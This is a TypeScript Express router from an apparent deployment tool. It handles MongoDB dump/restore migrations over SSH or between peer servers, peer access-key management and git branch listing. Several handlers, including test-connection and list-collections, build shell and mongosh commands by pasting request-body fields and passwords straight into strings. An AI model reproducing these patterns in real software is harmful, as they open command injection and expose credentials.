  ): Promise<{ stdout: NodeJS.ReadableStream; stdin?: NodeJS.WritableStream; done: Promise<void>; kill: () => void }> {
    // ── CDS peer source ── fetch from peer's local-dump
    if (source.type === 'cds') {
      const peer = stateService.getCdsPeer(source.cdsPeerId || '');
      if (!peer) throw new Error(`源 CDS 密钥不存在: ${source.cdsPeerId}`);
      cb.send(8, `连接源 CDS 「${peer.name}」...`);
      const peerRes = await peerRequest(peer, '/api/data-migrations/local-dump', 'POST', {
        database: source.database,
        collections: cols,
      });
      if ((peerRes.statusCode || 500) >= 400) {
        const chunks: Buffer[] = [];
        for await (const c of peerRes) chunks.push(c as Buffer);
        throw new Error(`源 CDS 返回 ${peerRes.statusCode}: ${Buffer.concat(chunks).toString('utf-8').slice(0, 400)}`);
      }
      cb.appendLog(`[source] CDS peer ${peer.name} (${peer.baseUrl}) streaming`);
      const done = new Promise<void>((resolve, reject) => {
        peerRes.on('end', resolve);
        peerRes.on('error', reject);
      });
      return {
        stdout: peerRes,
        done,
        kill: () => { try { peerRes.destroy(); } catch { /* */ } },
      };
    }

    // ── Local / remote via mongodump ──
    const eff = source.type === 'local' ? resolveMongoConn(source) : source;
    const dumpArgs = buildMongodumpArgs(
      eff.host, eff.port,
      { username: eff.username, password: eff.password, authDatabase: eff.authDatabase },
      eff.database, cols,
    );

    let cmd: string;
    let argv: string[];
    if (source.sshTunnel?.enabled) {
      cb.send(8, `通过 SSH 连接 ${source.sshTunnel.host}...`);
      const sshBase = buildSshBase(source.sshTunnel);
      const remoteCmd = buildRemoteMongoCmd('mongodump', dumpArgs, source.sshTunnel.dockerContainer);
      cb.appendLog(`[source] ssh ${source.sshTunnel.username}@${source.sshTunnel.host}: ${remoteCmd}`);
      cmd = 'ssh';
      argv = [...sshBase, remoteCmd];
    } else {
      cb.appendLog(`[source] mongodump ${dumpArgs.join(' ')}`);
      cmd = 'mongodump';
      argv = dumpArgs;
    }

    const child = spawn(cmd, argv, { stdio: ['ignore', 'pipe', 'pipe'] });
    let stderrTail = '';
    child.stderr!.on('data', (d: Buffer) => {
      const s = d.toString();
      stderrTail = (stderrTail + s).slice(-2000);
      for (const line of s.split('\n')) {
        if (line) { cb.appendLog(`[dump] ${line}`); cb.onProgressLine(line); }
      }
    });
    const done = new Promise<void>((resolve, reject) => {
      child.on('close', (code) => {
        if (code === 0) resolve();
        else reject(new Error(`mongodump 失败 (exit ${code}): ${stderrTail.slice(-400)}`));
      });
      child.on('error', (err) => reject(new Error(`无法启动 mongodump: ${err.message}`)));
    });
    return {
      stdout: child.stdout!,
      done,
      kill: () => { try { child.kill('SIGKILL'); } catch { /* */ } },
    };
  }

  /**
   * Build a consumer that accepts a `mongodump --archive --gzip` byte stream.
   * Returns a handle with a writable `stdin`, a `done` promise, and `kill()`.
   */
  async function buildTargetConsumer(
    target: MongoConnectionConfig,
    source: MongoConnectionConfig,
    cols: string[] | undefined,
    cb: {
      appendLog: (s: string) => void;
      onProgressLine: (line: string) => void;
      send: (progress: number, message: string) => void;
    },
  ): Promise<{ stdin: NodeJS.WritableStream; done: Promise<void>; kill: () => void }> {
    // ── CDS peer target ──
    if (target.type === 'cds') {
      const peer = stateService.getCdsPeer(target.cdsPeerId || '');
      if (!peer) throw new Error(`目标 CDS 密钥不存在: ${target.cdsPeerId}`);
      cb.send(12, `连接目标 CDS 「${peer.name}」...`);
      // Build URL with query params for target rename + collection filter
      const qs = new URLSearchParams();
      if (source.database) qs.set('sourceDb', source.database);
      if (target.database) qs.set('targetDb', target.database);
      if (cols && cols.length) qs.set('collections', cols.join(','));
      const apiPath = '/api/data-migrations/local-restore' + (qs.toString() ? '?' + qs.toString() : '');
      const url = new URL(peer.baseUrl.replace(/\/$/, '') + apiPath);
      const lib = url.protocol === 'https:' ? https : http;
      const httpReq = lib.request({
        method: 'POST',
        protocol: url.protocol,
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + url.search,
        headers: {
          'X-AI-Access-Key': peer.accessKey,
          'X-CDS-Peer-Call': '1',
          'Content-Type': 'application/octet-stream',
          // Chunked transfer (no Content-Length, just stream)
          'Transfer-Encoding': 'chunked',
        },
        timeout: 0,
      });
      httpReq.setTimeout(0);
      cb.appendLog(`[target] CDS peer ${peer.name} → ${apiPath}`);

      const done = new Promise<void>((resolve, reject) => {
        httpReq.on('response', (peerRes) => {
          const chunks: Buffer[] = [];
          peerRes.on('data', (d) => chunks.push(d as Buffer));
          peerRes.on('end', () => {
            const text = Buffer.concat(chunks).toString('utf-8');
            try {
              const j = JSON.parse(text);
              if (j && j.log) for (const line of String(j.log).split('\n')) if (line) { cb.appendLog(`[restore] ${line}`); cb.onProgressLine(line); }
            } catch { cb.appendLog(`[target] ${text.slice(0, 500)}`); }
            if ((peerRes.statusCode || 500) >= 400) {
              reject(new Error(`目标 CDS 返回 ${peerRes.statusCode}: ${text.slice(0, 400)}`));
            } else {
              resolve();
            }
          });
          peerRes.on('error', reject);
        });
        httpReq.on('error', (err) => reject(new Error(`连接目标 CDS 失败: ${err.message}`)));
      });

      return {
        stdin: httpReq,
        done,
        kill: () => { try { httpReq.destroy(); } catch { /* */ } },
      };
    }

    // ── Local / remote via mongorestore ──
    const eff = target.type === 'local' ? resolveMongoConn(target) : target;
    const restoreArgs = buildMongorestoreArgs(
      eff.host, eff.port,
      { username: eff.username, password: eff.password, authDatabase: eff.authDatabase },
      {
        drop: true,
        sourceDb: source.type !== 'cds' ? source.database : undefined,
        targetDb: eff.database,
        collections: cols,
      },
    );

    let cmd: string;
    let argv: string[];
    if (target.sshTunnel?.enabled) {
      cb.send(12, `通过 SSH 连接 ${target.sshTunnel.host}...`);
      const sshBase = buildSshBase(target.sshTunnel);
      const remoteCmd = buildRemoteMongoCmd('mongorestore', restoreArgs, target.sshTunnel.dockerContainer);
      cb.appendLog(`[target] ssh ${target.sshTunnel.username}@${target.sshTunnel.host}: ${remoteCmd}`);
      cmd = 'ssh';
      argv = [...sshBase, remoteCmd];
    } else {
      cb.appendLog(`[target] mongorestore ${restoreArgs.join(' ')}`);
      cmd = 'mongorestore';
      argv = restoreArgs;
    }

    const child = spawn(cmd, argv, { stdio: ['pipe', 'pipe', 'pipe'] });
    let stderrTail = '';
    const mirror = (prefix: string) => (d: Buffer) => {
      const s = d.toString();
      stderrTail = (stderrTail + s).slice(-2000);
      for (const line of s.split('\n')) {
        if (line) { cb.appendLog(`[${prefix}] ${line}`); cb.onProgressLine(line); }
      }
    };
    child.stderr!.on('data', mirror('restore'));
    child.stdout!.on('data', mirror('restore'));
    const done = new Promise<void>((resolve, reject) => {
      child.on('close', (code) => {
        if (code === 0) resolve();
        else reject(new Error(`mongorestore 失败 (exit ${code}): ${stderrTail.slice(-400)}`));
      });
      child.on('error', (err) => reject(new Error(`无法启动 mongorestore: ${err.message}`)));
    });
    return {
      stdin: child.stdin!,
      done,
      kill: () => { try { child.kill('SIGKILL'); } catch { /* */ } },
    };
  }

  // POST /api/data-migrations/:id/test-connection — test a MongoDB connection
  router.post('/data-migrations/test-connection', async (req, res) => {
    const { connection } = req.body as { connection: MongoConnectionConfig };
    if (!connection) { res.status(400).json({ error: '缺少 connection 参数' }); return; }

    try {
      let host = connection.host;
      let port = connection.port;

      // Resolve local
      if (connection.type === 'local') {
        const mongoInfra = stateService.getInfraServices().find(s => s.id === 'mongodb');
        if (!mongoInfra) { res.json({ success: false, error: '本机 MongoDB 未注册' }); return; }
        host = stateService.getCdsEnvVars()['CDS_HOST'] || '172.17.0.1';
        port = mongoInfra.hostPort;
      }

      // Build mongosh/mongo test command
      let testCmd = `mongosh --host ${host} --port ${port} --eval "db.adminCommand({ping:1})" --quiet`;
      if (connection.username) testCmd = `mongosh --host ${host} --port ${port} -u ${connection.username} -p ${connection.password || ''} --authenticationDatabase ${connection.authDatabase || 'admin'} --eval "db.adminCommand({ping:1})" --quiet`;

      const result = await shell.exec(testCmd, { timeout: 10000 });
      if (result.exitCode === 0) {
        // Get database list
        let listCmd = `mongosh --host ${host} --port ${port} --eval "JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>({name:d.name,sizeOnDisk:d.sizeOnDisk})))" --quiet`;
        if (connection.username) listCmd = `mongosh --host ${host} --port ${port} -u ${connection.username} -p ${connection.password || ''} --authenticationDatabase ${connection.authDatabase || 'admin'} --eval "JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>({name:d.name,sizeOnDisk:d.sizeOnDisk})))" --quiet`;

        const listResult = await shell.exec(listCmd, { timeout: 10000 });
        let databases: unknown[] = [];
        try { databases = JSON.parse(listResult.stdout.trim()); } catch { /* ok */ }
        res.json({ success: true, databases });
      } else {
        // Fallback: try basic TCP connectivity
        const tcpResult = await shell.exec(`timeout 5 bash -c "echo > /dev/tcp/${host}/${port}" 2>&1 || echo "TCP_FAILED"`);
        if (tcpResult.stdout.includes('TCP_FAILED')) {
          res.json({ success: false, error: `无法连接到 ${host}:${port}` });
        } else {
          res.json({ success: false, error: `连接成功但认证失败: ${result.stderr || result.stdout}` });
        }
      }
    } catch (e) {
      res.json({ success: false, error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/list-databases — list databases with sizes
  router.post('/data-migrations/list-databases', async (req, res) => {
    const { connection } = req.body as { connection: MongoConnectionConfig };
    if (!connection) { res.status(400).json({ error: '缺少 connection 参数' }); return; }
    try {
      const conn = resolveMongoConn(connection);
      const evalScript = `JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>({name:d.name,sizeOnDisk:d.sizeOnDisk})))`;
      const cmd = `mongosh --host ${conn.host} --port ${conn.port}${mongoAuthArgs(conn)} --eval "${evalScript}" --quiet 2>/dev/null`;
      const result = await shell.exec(cmd, { timeout: 15000 });
      let databases: Array<{ name: string; sizeOnDisk: number }> = [];
      if (result.exitCode === 0) {
        const lines = result.stdout.trim().split('\n');
        for (const line of lines) {
          const trimmed = line.trim();
          if (trimmed.startsWith('[')) { try { databases = JSON.parse(trimmed); break; } catch { /* */ } }
        }
      }
      // Filter out system databases for cleaner UX
      const userDbs = databases.filter(d => !['admin', 'config', 'local'].includes(d.name));
      const sysDbs = databases.filter(d => ['admin', 'config', 'local'].includes(d.name));
      res.json({ databases: [...userDbs, ...sysDbs] });
    } catch (e) {
      res.json({ databases: [], error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/list-collections — list collections in a database with doc counts
  router.post('/data-migrations/list-collections', async (req, res) => {
    const { connection } = req.body as { connection: MongoConnectionConfig };
    if (!connection) { res.status(400).json({ error: '缺少 connection 参数' }); return; }
    if (!connection.database) { res.status(400).json({ error: '请指定数据库名' }); return; }

    try {
      const conn = resolveMongoConn(connection);
      const db = conn.database!;
      const evalScript = `JSON.stringify(db.getSiblingDB('${db}').getCollectionInfos({type:'collection'}).map(c=>({name:c.name,count:db.getSiblingDB('${db}').getCollection(c.name).estimatedDocumentCount()})))`;
      let cmd = `mongosh --host ${conn.host} --port ${conn.port}${mongoAuthArgs(conn)} --eval "${evalScript}" --quiet 2>/dev/null`;

      const result = await shell.exec(cmd, { timeout: 15000 });
      if (result.exitCode !== 0) {
        res.json({ collections: [], error: result.stderr || 'mongosh 执行失败' });
        return;
      }
      // Parse JSON — mongosh may output extra lines, find the JSON array line
      const lines = result.stdout.trim().split('\n');
      let collections: Array<{ name: string; count: number }> = [];
      for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed.startsWith('[')) {
          try { collections = JSON.parse(trimmed); break; } catch { /* try next line */ }
        }
      }
      collections.sort((a, b) => a.name.localeCompare(b.name));
      res.json({ collections });
    } catch (e) {
      res.json({ collections: [], error: (e as Error).message });
    }
  });

  // GET /api/data-migrations/:id/log — get migration log
  router.get('/data-migrations/:id/log', (req, res) => {
    const migration = stateService.getDataMigration(req.params.id);
    if (!migration) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    res.json({ log: migration.log || '' });
  });

  // POST /api/data-migrations/test-tunnel — verify an SSH tunnel config
  // Runs `ssh user@host echo __cds_ok__` with the supplied credentials.
  router.post('/data-migrations/test-tunnel', async (req, res) => {
    const { sshTunnel } = req.body as { sshTunnel: MongoConnectionConfig['sshTunnel'] };
    if (!sshTunnel || !sshTunnel.host || !sshTunnel.username) {
      res.json({ success: false, error: '请填写 SSH 主机和用户名' });
      return;
    }
    try {
      const sshBase = buildSshBase(sshTunnel);
      // Add 'echo __cds_ok__' as the remote command and enforce a 15s timeout on client side
      const argv = [...sshBase, `echo __cds_ok__`];
      const result = await new Promise<{ code: number; stdout: string; stderr: string }>((resolve) => {
        const child = spawn('ssh', argv, { stdio: ['ignore', 'pipe', 'pipe'] });
        let stdout = ''; let stderr = '';
        const timer = setTimeout(() => { try { child.kill('SIGKILL'); } catch { /* */ } }, 15000);
        child.stdout.on('data', (d) => { stdout += d.toString(); });
        child.stderr.on('data', (d) => { stderr += d.toString(); });
        child.on('close', (code) => { clearTimeout(timer); resolve({ code: code ?? 1, stdout, stderr }); });
        child.on('error', (err) => { clearTimeout(timer); resolve({ code: 1, stdout, stderr: err.message }); });
      });
      if (result.code === 0 && result.stdout.includes('__cds_ok__')) {
        // Optional: also check mongodump availability on the remote side
        let mongoNote = '';
        if (sshTunnel.dockerContainer) {
          mongoNote = `（通过容器 ${sshTunnel.dockerContainer}）`;
        } else {
          const toolCheck = await new Promise<{ code: number; stdout: string }>((resolve) => {
            const child = spawn('ssh', [...sshBase, 'which mongodump 2>/dev/null || echo NOT_FOUND'], { stdio: ['ignore', 'pipe', 'pipe'] });
            let stdout = '';
            const timer = setTimeout(() => { try { child.kill('SIGKILL'); } catch { /* */ } }, 10000);
            child.stdout.on('data', (d) => { stdout += d.toString(); });
            child.on('close', (code) => { clearTimeout(timer); resolve({ code: code ?? 1, stdout }); });
            child.on('error', () => { clearTimeout(timer); resolve({ code: 1, stdout: '' }); });
          });
          if (toolCheck.stdout.includes('NOT_FOUND')) {
            mongoNote = '（警告 远程未找到 mongodump；建议配置 docker 容器名）';
          } else {
            mongoNote = '（远程 mongodump 可用）';
          }
        }
        res.json({ success: true, message: `SSH 连接成功 ${mongoNote}` });
      } else {
        res.json({ success: false, error: (result.stderr || 'SSH 连接失败').trim().slice(0, 400) });
      }
    } catch (e) {
      res.json({ success: false, error: (e as Error).message });
    }
  });

  // ─────────────────────────────────────────────────────────────────
  //   CDS Peer Registry (one-click cross-CDS migration)
  // ─────────────────────────────────────────────────────────────────

  // GET /api/data-migrations/my-key — return this CDS's own access key so the user can copy it.
  //
  // Response:
  //   { accessKey: string|null, baseUrl: string, label: string, hint: string }
  //
  // If no key is configured, `accessKey` is null and the caller can show a
  // "set AI_ACCESS_KEY first" banner.
  router.get('/data-migrations/my-key', (req, res) => {
    const accessKey = getLocalAccessKey();
    const baseUrl = guessLocalBaseUrl(req);
    const label = `${baseUrl}`;
    res.json({
      accessKey,
      baseUrl,
      label,
      hint: accessKey
        ? '复制下面的 baseUrl + 访问密钥，在另一台 CDS 的「CDS 密钥管理」中添加即可双向迁移。'
        : '当前 CDS 未设置 AI_ACCESS_KEY，请先在「设置 → 环境变量」中配置 AI_ACCESS_KEY 后再试。',
    });
  });

  // GET /api/data-migrations/peers — list registered peers (access keys are returned masked)
  router.get('/data-migrations/peers', (_req, res) => {
    const peers = stateService.getCdsPeers().map(p => ({
      ...p,
      // Mask the key — show only last 6 chars so the user can recognize it without leaking it in HTTP logs
      accessKey: p.accessKey ? `••••${p.accessKey.slice(-6)}` : '',
    }));
    res.json(peers);
  });

  // POST /api/data-migrations/peers — add a new peer. Auto-verifies by calling the peer's /my-key.
  router.post('/data-migrations/peers', async (req, res) => {
    const { name, baseUrl, accessKey } = req.body as { name?: string; baseUrl?: string; accessKey?: string };
    if (!name || !baseUrl || !accessKey) {
      res.status(400).json({ error: '缺少必填字段: name, baseUrl, accessKey' });
      return;
    }
    try { new URL(baseUrl); } catch { res.status(400).json({ error: 'baseUrl 格式错误' }); return; }
    const peer: CdsPeer = {
      id: `peer-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`,
      name,
      baseUrl: baseUrl.replace(/\/$/, ''),
      accessKey,
      createdAt: new Date().toISOString(),
    };
    // Verify — call /my-key to confirm the access key works
    try {
      const probe = await peerRequestJson<{ baseUrl: string; accessKey: string | null }>(peer, '/api/data-migrations/my-key', 'GET');
      peer.lastVerifiedAt = new Date().toISOString();
      peer.remoteLabel = probe.baseUrl || baseUrl;
    } catch (e) {
      res.status(400).json({ error: `验证失败: ${(e as Error).message}` });
      return;
    }
    stateService.addCdsPeer(peer);
    stateService.save();
    // Return masked version
    res.json({ ...peer, accessKey: `••••${accessKey.slice(-6)}` });
  });

  // PUT /api/data-migrations/peers/:id — update peer (name / baseUrl / accessKey)
  router.put('/data-migrations/peers/:id', async (req, res) => {
    const { id } = req.params;
    const existing = stateService.getCdsPeer(id);
    if (!existing) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    const { name, baseUrl, accessKey } = req.body as { name?: string; baseUrl?: string; accessKey?: string };
    const updates: Partial<CdsPeer> = {};
    if (name !== undefined) updates.name = name;
    if (baseUrl !== undefined) updates.baseUrl = baseUrl.replace(/\/$/, '');
    // Only update accessKey if caller provided a value that doesn't look masked (••••)
    if (accessKey !== undefined && !accessKey.startsWith('•')) updates.accessKey = accessKey;
    stateService.updateCdsPeer(id, updates);
    stateService.save();
    const updated = stateService.getCdsPeer(id)!;
    res.json({ ...updated, accessKey: `••••${updated.accessKey.slice(-6)}` });
  });

  // DELETE /api/data-migrations/peers/:id
  router.delete('/data-migrations/peers/:id', (req, res) => {
    const { id } = req.params;
    if (!stateService.getCdsPeer(id)) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    stateService.removeCdsPeer(id);
    stateService.save();
    res.json({ message: '已删除' });
  });

  // POST /api/data-migrations/peers/:id/test — verify a peer's connectivity
  router.post('/data-migrations/peers/:id/test', async (req, res) => {
    const peer = stateService.getCdsPeer(req.params.id);
    if (!peer) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    try {
      const probe = await peerRequestJson<{ baseUrl: string; accessKey: string | null }>(peer, '/api/data-migrations/my-key', 'GET');
      stateService.updateCdsPeer(peer.id, { lastVerifiedAt: new Date().toISOString(), remoteLabel: probe.baseUrl });
      stateService.save();
      res.json({ success: true, remoteLabel: probe.baseUrl, verifiedAt: new Date().toISOString() });
    } catch (e) {
      res.json({ success: false, error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/peers/:id/list-databases — proxy to peer's list-databases for its local infra MongoDB
  router.post('/data-migrations/peers/:id/list-databases', async (req, res) => {
    const peer = stateService.getCdsPeer(req.params.id);
    if (!peer) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    try {
      const result = await peerRequestJson<{ databases: Array<{ name: string; sizeOnDisk: number }>; error?: string }>(
        peer,
        '/api/data-migrations/list-databases',
        'POST',
        { connection: { type: 'local', host: '', port: 0 } },
      );
      res.json(result);
    } catch (e) {
      res.json({ databases: [], error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/peers/:id/list-collections — proxy list-collections for a database on the peer
  router.post('/data-migrations/peers/:id/list-collections', async (req, res) => {
    const peer = stateService.getCdsPeer(req.params.id);
    if (!peer) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    const { database } = req.body as { database?: string };
    if (!database) { res.status(400).json({ error: '请指定 database' }); return; }
    try {
      const result = await peerRequestJson<{ collections: Array<{ name: string; count: number }>; error?: string }>(
        peer,
        '/api/data-migrations/list-collections',
        'POST',
        { connection: { type: 'local', host: '', port: 0, database } },
      );
      res.json(result);
    } catch (e) {
      res.json({ collections: [], error: (e as Error).message });
    }
  });

  // ─────────────────────────────────────────────────────────────────
  //   Streaming endpoints called by remote peers (auth-protected)
  // ─────────────────────────────────────────────────────────────────

  // POST /api/data-migrations/local-dump — streams mongodump bytes for this
  // CDS's local infra MongoDB. Authorized via the standard CDS middleware
  // (cds cookie / X-AI-Access-Key). Used by remote peers to pull data.
  //
  // Body: { database?: string, collections?: string[] }
  router.post('/data-migrations/local-dump', async (req, res) => {
    const body = (req.body || {}) as { database?: string; collections?: string[] };
    let eff: MongoConnectionConfig;
    try {
      eff = resolveMongoConn({ type: 'local', host: '', port: 0, database: body.database });
    } catch (e) {
      res.status(500).json({ error: (e as Error).message });
      return;
    }
    const dumpArgs = buildMongodumpArgs(
      eff.host, eff.port,
      {},
      body.database,
      body.collections,
    );
    res.writeHead(200, {
      'Content-Type': 'application/octet-stream',
      'Cache-Control': 'no-cache',
      'X-Accel-Buffering': 'no',
    });
    const child = spawn('mongodump', dumpArgs, { stdio: ['ignore', 'pipe', 'pipe'] });
    let stderrTail = '';
    child.stderr.on('data', (d) => { stderrTail = (stderrTail + d.toString()).slice(-2000); });
    child.stdout.pipe(res);
    child.on('close', (code) => {
      if (code !== 0) {
        // We may already have sent headers — append a trailer-like marker
        try { res.write(`\n__CDS_DUMP_ERROR__:${stderrTail.slice(-400)}`); } catch { /* */ }
      }
      try { res.end(); } catch { /* */ }
    });
    child.on('error', (err) => {
      try {
        if (!res.headersSent) res.status(500).json({ error: err.message });
        else res.end();
      } catch { /* */ }
    });
    // If the client aborts the download, kill the dump.
    // IMPORTANT: use res.on('close'), NOT req.on('close'). In Node.js 18+,
    // req.on('close') fires as soon as express.json() finishes reading the
    // request body (before the handler even writes output), which would
    // kill mongodump immediately and return an empty 0-byte response.
    res.on('close', () => {
      if (!res.writableEnded) { try { child.kill('SIGKILL'); } catch { /* */ } }
    });
  });

  // POST /api/data-migrations/local-restore — pipes request body into
  // mongorestore against this CDS's local infra MongoDB.
  //
  // Query params: sourceDb, targetDb, collections (comma-separated)
  router.post('/data-migrations/local-restore', async (req, res) => {
    const sourceDb = (req.query.sourceDb as string | undefined) || undefined;
    const targetDb = (req.query.targetDb as string | undefined) || undefined;
    const colsParam = req.query.collections as string | undefined;
    const collections = colsParam ? colsParam.split(',').filter(Boolean) : undefined;

    let eff: MongoConnectionConfig;
    try {
      eff = resolveMongoConn({ type: 'local', host: '', port: 0, database: targetDb });
    } catch (e) {
      res.status(500).json({ error: (e as Error).message });
      return;
    }
    const restoreArgs = buildMongorestoreArgs(
      eff.host, eff.port,
      {},
      { drop: true, sourceDb, targetDb, collections },
    );
    const child = spawn('mongorestore', restoreArgs, { stdio: ['pipe', 'pipe', 'pipe'] });
    let stderrTail = '';
    const logLines: string[] = [];
    const mirror = (d: Buffer) => {
      const s = d.toString();
      stderrTail = (stderrTail + s).slice(-4000);
      for (const line of s.split('\n')) if (line) logLines.push(line);
    };
    child.stderr.on('data', mirror);
    child.stdout.on('data', mirror);

    // Pipe request body into mongorestore stdin
    req.pipe(child.stdin);

    // If the client aborts upload, kill the restore process
    req.on('error', () => { try { child.kill('SIGKILL'); } catch { /* */ } });
    req.on('close', () => {
      // End of request body — close stdin so mongorestore can finish
      try { child.stdin.end(); } catch { /* */ }
    });

    child.on('close', (code) => {
      if (code === 0) {
        res.json({ success: true, log: logLines.join('\n') });
      } else {
        res.status(500).json({ success: false, error: stderrTail.slice(-400) || `mongorestore exited ${code}`, log: logLines.join('\n') });
      }
    });
    child.on('error', (err) => {
      if (!res.headersSent) res.status(500).json({ success: false, error: err.message });
    });
  });

  // GET /api/self-branches — list git branches of the CDS repo itself
  //
  // 2026-05-28 重构:实际扫描逻辑抽到 scanRemoteBranchesFromGit(),
  // self-status-cache 也用同一个函数。/self-branches 端点改为"读 cache + 200 降级"。
  async function scanRemoteBranchesFromGit(): Promise<RemoteBranchEntry[]> {
    // Get current branch
    let currentBranch = '';
    try {
      const currentResult = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: config.repoRoot });
      currentBranch = currentResult.stdout.trim();
    } catch {
      // 拿不到 currentBranch 也不致命,cdsTouched 全部置 false
    }

    // Fetch latest (ignore errors if offline) — 这是分支扫描场景,失败时尝试用 cached refs
    const auth = await gitAuthForRepo(config.repoRoot);
    await shell.exec('git fetch --all --prune', { cwd: config.repoRoot, env: auth.env }).catch(() => {});

    // 一次性拉所有 remote branch 的 metadata。
    // Bugbot 第八轮 fix(2026-05-04):用 `%1f` 让 git 输出真 0x1F 字节,
    // 然后 JS 用 '\x1f'(单个真 0x1F)split。
    const refResult = await shell.exec(
      `git for-each-ref --sort=-committerdate ` +
      `--format='%(refname:short)%1f%(committerdate:iso8601-strict)%1f%(objectname:short)%1f%(subject)' ` +
      `refs/remotes/origin/`,
      { cwd: config.repoRoot, timeout: 30_000 },
    );

    const branches: RemoteBranchEntry[] = [];
    const seen = new Set<string>();
    for (const line of refResult.stdout.split('\n')) {
      if (!line.trim()) continue;
      const parts = line.split('\x1f');
      if (parts.length < 4) continue;
      let name = parts[0].trim();
      if (name.startsWith('origin/')) name = name.slice('origin/'.length);
      if (name === 'HEAD' || name.includes('HEAD ->')) continue;
      if (seen.has(name)) continue;
      seen.add(name);
      branches.push({
        name,
        committerDate: parts[1].trim(),
        commitHash: parts[2].trim(),
        subject: parts[3].trim(),
        cdsTouched: false,
      });
    }

    // cdsTouched 只对 top 30 算,避免慢
    const top = branches.slice(0, 30);
    await Promise.all(
      top.map(async (b) => {
        if (!currentBranch || b.name === currentBranch) return;
        try {
          const diff = await shell.exec(
            `git log --format=%H -n 1 origin/${currentBranch}..origin/${b.name} -- cds/`,
            { cwd: config.repoRoot, timeout: 5_000 },
          );
          b.cdsTouched = diff.stdout.trim().length > 0;
        } catch {
          /* tolerate */
        }
      }),
    );

    return branches;
  }

  // GET /api/self-branches — 列出可切换的远端分支,供 MaintenanceTab 选择
  //
  // 2026-05-28 重构:不再每次直接扫 git,改读 selfStatusCache.getSnapshot().remoteBranches。
  // 失败永远返 200 + degraded,不再 500。
  router.get('/self-branches', async (_req, res) => {
    const snapshot = selfStatusCache.getSnapshot();
    const lastKnownGood = selfStatusCache.getLastKnownGood();
    // 选数据源:优先当前 snapshot;空时回退到 lastKnownGood
    const branchSource =
      snapshot.remoteBranches.length > 0
        ? snapshot.remoteBranches
        : lastKnownGood?.remoteBranches ?? [];

    const currentBranch = snapshot.currentBranch || lastKnownGood?.currentBranch || '';
    const commitHash = snapshot.headSha || lastKnownGood?.headSha || '';
    const currentCommitterDate = snapshot.headIso || lastKnownGood?.headIso || '';

    const degraded = snapshot.degraded;
    const usingLastKnownGood = snapshot.remoteBranches.length === 0 && (lastKnownGood?.remoteBranches.length ?? 0) > 0;

    // 2026-05-28 目标第 6 节:"git fetch / branch scan 只能由后端任务触发"。
    // 本端点只读 cache,不再触发 enqueueRefresh。cache 由 cds-events 订阅 +
    // POST /api/self-refresh + GitHub webhook 三路触发,本端点纯被动消费。

    res.json({
      ok: !degraded && !usingLastKnownGood,
      degraded: degraded ? true : false,
      reason: degraded?.reason ?? null,
      message: degraded?.message ?? null,
      lastKnownGood: usingLastKnownGood ? { fromTs: lastKnownGood?.lastRefreshAt } : null,
      // 主体数据:即使 degraded 也尽量给前端能用的字段(可能是空数组)
      current: currentBranch,
      commitHash,
      currentCommitterDate,
      branchDetails: branchSource,
      branches: branchSource.map((b) => b.name),
    });
  });

  // GET /api/loading-pages/cds-waiting-room/preview — system-settings preview
  // for hard-to-trigger loading screens. It intentionally reuses
  // ProxyService.serveStartingPageV2 so opacity, MagicRings canvas, masks, and
  // fallback page chrome stay byte-for-byte tied to the real preview path.
  router.get('/loading-pages/cds-waiting-room/preview', (req, res) => {
    const requestedStatus = String(req.query.status || 'building');
    const allowedStatuses = new Set(['idle', 'building', 'starting', 'running', 'restarting', 'stopping', 'error']);
    const status = allowedStatuses.has(requestedStatus) ? requestedStatus as BranchEntry['status'] : 'building';
    const serviceStatus = status === 'error'
      ? 'error'
      : status === 'running'
        ? 'running'
        : status === 'idle'
          ? 'idle'
          : status === 'stopping'
            ? 'stopping'
            : 'starting';
    const branch: BranchEntry = {
      id: 'loading-preview',
      projectId: 'default',
      branch: 'loading-preview',
      worktreePath: path.join(config.worktreeBase || config.repoRoot, 'loading-preview'),
      status,
      errorMessage: status === 'error' ? '示例错误: 服务启动失败，返回控制台查看日志。' : undefined,
      createdAt: new Date().toISOString(),
      services: {
        api: {
          profileId: 'api',
          containerName: 'cds-loading-preview-api',
          hostPort: 10501,
          status: serviceStatus,
        },
        admin: {
          profileId: 'admin',
          containerName: 'cds-loading-preview-admin',
          hostPort: 10502,
          status: serviceStatus,
        },
      },
    };
    new ProxyService(stateService, config).serveStartingPageV2(
      res as unknown as http.ServerResponse,
      String(req.query.branch || 'cds-loading-preview'),
      branch,
      String(req.query.waitingProfile || 'api'),
    );
  });

  router.get('/loading-pages/cds-waiting-room-legacy/preview', (req, res) => {
    const requestedStatus = String(req.query.status || 'building');
    const allowedStatuses = new Set(['idle', 'building', 'starting', 'running', 'restarting', 'stopping', 'error']);
    const status = allowedStatuses.has(requestedStatus) ? requestedStatus : 'building';
    res.writeHead(503, {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Retry-After': '2',
    });
    res.end(buildLegacyWaitingPreviewHtml(
      String(req.query.branch || 'shape-grid-waiting-backup'),
      status,
      String(req.query.waitingProfile || 'api'),
    ));
  });

  router.get('/loading-pages/branch-gone/preview', (req, res) => {
    const theme = String(req.query.theme || 'dark') === 'light' ? 'light' : 'dark';
    const slug = String(req.query.branch || 'claude/removed-preview-branch');
    res.writeHead(200, {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
    });
    res.end(buildLoadingPreviewBranchGoneHtml(slug, theme));
  });

  // GET /api/self-status — CDS 自身的更新状态全景
  //
  // 2026-05-04(用户反馈"我不清楚是否有自动更新, 这里需要显示"):
